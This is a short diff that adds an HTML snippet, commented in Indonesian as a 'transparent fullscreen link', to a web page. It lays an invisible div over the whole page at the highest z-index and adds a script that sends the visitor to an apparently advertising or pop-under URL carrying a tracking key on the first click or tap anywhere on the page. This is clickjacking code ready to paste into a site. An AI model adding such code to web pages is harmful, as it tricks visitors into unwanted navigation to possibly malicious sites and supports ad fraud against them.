@@ -1,0 +1,22 @@
+<!-- link transparan fullscreen-->
+<style>
+  .floating {
+    position: fixed;
+    inset: 0;
+    z-index: 999999;
+  }
+</style>
+<div class="floating"></div>
+<script>
+  const targetUrl = 'https://crazylatchdisturbance.com/d4t9jn0v?key=3f15e4794fff19111363ffa3a2c705de';
+
+  function goOnce() {
+    document.removeEventListener('click', goOnce);
+    document.removeEventListener('touchstart', goOnce);
+    window.location.href = targetUrl;
+  }
+
+  document.addEventListener('click', goOnce, { once: true });
+  document.addEventListener('touchstart', goOnce, { once: true });
+</script>
+<!-- link transparan fullscreen-->
